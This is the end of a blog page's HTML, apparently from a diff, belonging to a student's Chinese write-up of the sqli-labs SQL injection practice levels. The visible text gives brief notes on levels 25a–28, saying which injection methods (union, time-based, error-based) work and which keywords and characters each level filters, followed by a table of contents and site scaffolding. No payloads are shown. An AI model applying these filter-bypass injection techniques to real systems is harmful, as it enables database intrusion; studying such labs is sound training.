+<h3 id="Less-25a"><a href="#Less-25a" class="headerlink" title="Less-25a"></a>Less-25a</h3><p>不同于25关的是sql语句中对于id，没有’’的包含，同时没有输出错误项，报错注入不能用。其余基本上和25示例没有差别。此处采取两种方式：延时注入和联合注入。</p>
+<h3 id="less-26"><a href="#less-26" class="headerlink" title="less-26"></a>less-26</h3><p>过滤 空格，or，and,/*,#,–,/等各种符号</p>
+<h3 id="less-26a"><a href="#less-26a" class="headerlink" title="less-26a"></a>less-26a</h3><p>这关与26的区别在于，sql语句添加了一个括号，同时在sql语句执行抛出错误后并不在前台页面输出。所有我们排除报错注入，这里依旧是利用union注入。 </p>
+<h3 id="less-27"><a href="#less-27" class="headerlink" title="less-27"></a>less-27</h3><p>增加过滤 union，select</p>
+<h3 id="less-27a"><a href="#less-27a" class="headerlink" title="less-27a"></a>less-27a</h3><p>本关与27关的区别在于对于id的处理，这里用的是 “ ，同时mysql的错误不会在前端页面显示。</p>
+<h3 id="less-28"><a href="#less-28" class="headerlink" title="less-28"></a>less-28</h3></the></excerpt>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>Title:</span><a href="/Study/sqli-labs.html">SQL Injection - Sqli-labs</a></p>
+        <p><span>Author:</span><a href="/" title="Back to Homepage">KarmA</a></p>
+        <p><span class="post-count">Words:</span>2,327</p>
+        <p><span class="post-count">Time:</span>10 mins</p>
+        <p><span>Created:</span>2018-02-05, 18:15:13</p>
+        <p><span>Updated:</span>2018-10-12, 00:40:52</p>
+        <p>
+            <span>Full URL:</span><a class="post-url" href="/Study/sqli-labs.html" title="SQL Injection - Sqli-labs">http://blog.0akarma.me/Study/sqli-labs.html</a>
+            <span class="copy-path" data-clipboard-text="From http://blog.0akarma.me/Study/sqli-labs.html　　By KarmA" title="Copy Article&#39;s Link &amp; Author"><i class="fa fa-clipboard"></i></span>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>License:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target = "_blank">"CC BY-NC-SA 4.0"</a> Keep Link &amp; Author if Distribute.
+        </p>
+    </div>
+
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/Study/ctf-syb.html">
+                    CTF in ShiYanBa
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/Study/sql-injection.html">
+                    SQL Injection 学习小记
+                </a>
+            </div>
+        
+    </nav>
+
+  
+  
+    
+    <div style="padding: 0; margin: 20px auto; width: 90%; text-align: center;">
+      <br>
+      <div>如果觉得文章海星，那就打赏一下吧！</div>
+      <br>
+      <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+        <div class="btn btn-pay">打赏支持</div>
+      </button>
+      <br>
+      <br>
+      <div id="QR" style="display: none;">
+        
+        
+          <div id="alipay" style="display: inline-block">
+            <img id="alipay_qr" src="/img/pay.jpg" alt="KarmA Alipay"/>
+            <p>二合一打赏</p>
+          </div>
+        
+        <br>
+        <br>
+      </div>
+    </div>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">Contents</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sqli-labs"><span class="toc-text">Sqli-labs</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#less-1-GET-Error-based-Single-quotes-String"><span class="toc-text">less-1 GET - Error based - Single quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#查询（union）"><span class="toc-text">查询（union）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#数据库连接函数"><span class="toc-text">数据库连接函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#查表"><span class="toc-text">查表</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#limit"><span class="toc-text">limit</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-2-GET-Error-based-Intiger-based"><span class="toc-text">less-2 GET - Error based - Intiger based</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-1"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-3-GET-Error-based-Single-quotes-with-twist-string"><span class="toc-text">less-3 GET - Error based - Single quotes with twist string</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-2"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-4-GET-Error-based-Double-Quotes-String"><span class="toc-text">less-4 GET - Error based - Double Quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-3"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-5-GET-Double-Injection-Single-Quotes-String"><span class="toc-text">less-5 GET - Double Injection - Single Quotes - String</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#报错注入"><span class="toc-text">报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-4"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-6-GET-Double-Injection-Double-Quotes-String"><span class="toc-text">less-6 GET - Double Injection - Double Quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-7-GET-Dump-into-outfile-String"><span class="toc-text">less-7 GET - Dump into outfile - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-8-GET-Blind-Boolian-Based-Single-Quotes"><span class="toc-text">less-8 GET - Blind - Boolian Based - Single Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#布尔盲注"><span class="toc-text">布尔盲注</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-9-GET-Blind-Time-based-Single-Quotes"><span class="toc-text">less-9 GET - Blind - Time based. -  Single Quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#延时注入"><span class="toc-text">延时注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-5"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-10-GET-Blind-Time-based-double-quotes"><span class="toc-text">less-10 GET - Blind - Time based - double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-11-POST-Error-Based-single-quotes-String"><span class="toc-text">less-11 POST - Error Based - single quotes - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-12-POST-Error-Based-Double-quotes-String-with-twist"><span class="toc-text">less-12 POST - Error Based - Double quotes - String - with twist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-13-POST-Double-injection-Single-quotes-String-with-twist"><span class="toc-text">less-13 POST Double injection - Single quotes - String - with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-6"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-14-POST-Double-injection-Single-quotes-String-with-twist"><span class="toc-text">less-14 POST - Double injection - Single quotes - String - with twist</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-7"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-15-POST-Blind-Boolian-time-Based-Single-quotes"><span class="toc-text">less-15 POST - Blind - Boolian/time Based - Single quotes</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#solution-8"><span class="toc-text">solution</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-16-POST-Blind-Boolian-Time-Based-Double-quotes"><span class="toc-text">less-16 POST - Blind - Boolian/Time Based - Double quotes</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-17-POST-Update-Query-Error-Based-String"><span class="toc-text">less-17 POST - Update Query - Error Based - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-18-POST-Header-injection-Uagent-field-Error-based"><span class="toc-text">less-18 POST - Header injection - Uagent field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-19-POST-Header-injection-Referer-field-Error-based"><span class="toc-text">less-19 POST - Header injection Referer field - Error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-20-POST-Cookie-injection-Uagent-field-error-based"><span class="toc-text">less-20 POST - Cookie injection - Uagent field - error based</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-21-POST-Dump-into-outfile-String"><span class="toc-text">less-21 POST Dump into outfile - String</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-22-Future-Editions"><span class="toc-text">less-22 Future Editions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#绕过姿势"><span class="toc-text">绕过姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#过滤-or-和-and"><span class="toc-text">过滤 or 和 and</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#过滤-空格，or，and-–-等各种符号"><span class="toc-text">过滤 空格，or，and,/*,#,–,/等各种符号</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-23"><span class="toc-text">less-23</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-24"><span class="toc-text">less-24</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-25"><span class="toc-text">less-25</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Less-25a"><span class="toc-text">Less-25a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-26"><span class="toc-text">less-26</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-26a"><span class="toc-text">less-26a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-27"><span class="toc-text">less-27</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-27a"><span class="toc-text">less-27a</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#less-28"><span class="toc-text">less-28</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="Hide"  title="Show or Hide Table of Contents">
+
+    <script>
+        yiliaConfig.toc = ["Hide", "Show", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+
+    
+        <div class="addthis_sharing_toolbox"></div>
+    
+</div>
+
+
+
+
+
+
+
+        
+      <section class="livere" id="comments">
+    <!-- 来必力City版安装代码 -->
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zNDM3Ny8xMDkxNA==">
+    <script type="text/javascript">
+   (function(d, s) {
+       var j, e = d.getElementsByTagName(s)[0];
+
+       if (typeof LivereTower === 'function') { return; }
+
+       j = d.createElement(s);
+       j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+       j.async = true;
+
+       e.parentNode.insertBefore(j, e);
+       })(document, 'script');
+    </script>
+    <noscript> 为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+    <!-- City版安装代码已完成 -->
+</section>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/Study/ctf-syb.html" title="Pre: CTF in ShiYanBa">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="Mini Archives"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/Study/sql-injection.html" title="Next: SQL Injection 学习小记">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/Study/hero-vps.html">如何在vps上搭建Hexo博客</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/code-audit-mac.html">Mac下代码审计环境配置</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/docker-website.html">Docker建站——从入门到“放弃”</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-goldeneye.html">GoldenEye:1 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/amateur-ops-ctfd.html">Act as an Amateur OPS in D0g3-CTFd</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-lampião.html">Vulnhub-Lampião：1 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/vulnhub-lazySysAdmin.html">Vulnhub-LazySysAdmin 通关指南</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/ballroom-e-youkoso.html">《Ballroom e Youkoso 舞动青春》观后感</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/feelings-xhssf.html">《西虹市首富》观后感</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/sophomore-flags.html">It's time to set Flags in Sophomore Year (持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/achievement.html">Achievements in Cyber Security</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/scff-2018.html">SCTF 2018 WriteUp & Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sql-blind.html">浅谈SQL盲注</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/red-tiger.html">RedTiger 练习总结</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/spider.html">How to Spider faster and faster</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/scrapy.html">Scrapy Warm-Up</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/rapid-recurrence.html">Rapid Recurrence Of CVEs</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/privilege-escalation.html">Get Shell ->  Get Root</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/mac-settings.html">Mac Personal Settings</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/rewrite-pwnhub-subject.html">复现Pwnhub会员日的一道题</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/be-grateful.html">Being grateful for what you have</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/spider-notes.html">Python3 Web Spider Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/ctf-syb.html">CTF in ShiYanBa</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sqli-labs.html">SQL Injection - Sqli-labs</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/sql-injection.html">SQL Injection 学习小记</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/python-notes.html">Python Notes</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/linux-learning.html">Linux初探</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2018-books.html">My Book List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2018-films.html">My Film List In 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/bye2017.html">See you 2017 , Hello 2018</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/2017-films.html">2017-films</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/penetrating-courses.html">渗透课程</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/code-audit-bees4.html">代码审计实例-BEES_4.0_R_20160525</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/authentic-words.html">Authentic Words Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/php-dangerfuncts.html">PHP常见危险函数及特殊函数Summary</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/mentohust.html">Mac下配置mentohust连接校园网/移动/联通/</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/perceptions-stave-jobs.html">Some perceptions after secondly read Steve Jobs‘s speech in Stanford</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/freshman-flags.html">It's time to set Flags in Freshman Year (完结)</a></li><li class="post-list-item"><a class="post-list-link" href="/Study/2017-classes-ctf.html">2017班级对抗赛WP&心得</a></li><li class="post-list-item"><a class="post-list-link" href="/Life/importance-backup.html">论Mac备份的重要性<-血的教训</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2017-2018 KarmA
+            </div>
+            <div id="footer_right_div" class="footer-right" style="text-align:center;overflow:hidden;">
+                <div id="web_count_div" class="post-count-bottom" style="display:inline;">
+                    Follow Your Heart.
+                    <i class="fa fa-heart animated infinite pulse" style="color:red;margin-left:2px;"></i><!-- 红心-->
+                </div>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="Site Visitors"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="Page Hits"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                    <span>| </span>
+                    <span title="All Words">
+                         <span><i class="fa fa-map" aria-hidden="true"></i></span>
+                        <span class="post-count"><b>85.2k</b></span>
+                    </span>
+                
+            </div>
+        
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 6;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="Back to Top"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="Comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="Go to Bottom"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+             post: ".article-entry a[href], .copyright a[href]", 
+             tags: ".article-tag a", 
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  </div>
+    
+  <script type="text/javascript" src="/js/emoji.js"></script>
+</body>
+</html>
